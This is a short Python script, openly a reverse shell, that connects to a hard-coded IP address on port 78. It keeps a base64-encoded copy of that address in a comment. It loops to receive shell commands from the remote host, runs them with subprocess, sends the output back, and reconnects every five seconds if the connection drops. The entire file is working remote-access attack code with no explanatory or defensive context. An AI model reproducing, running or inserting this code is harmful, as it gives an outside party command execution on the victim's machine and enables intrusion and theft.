import socket
import subprocess
import os
import base64
import time
def reverse_shell():
    # host = base64.b64decode(b'MTcyLjIxLjU0LjIzMw==').decode()  
    host = '172.21.54.233'
    port = 78 # Replace with your port number

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        s.send(b'Changed directory')
                    except Exception as e:
                        s.send(str(e).encode())
                else:
                    output = subprocess.getoutput(command)
                    s.send(output.encode())

            s.close()
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    reverse_shell()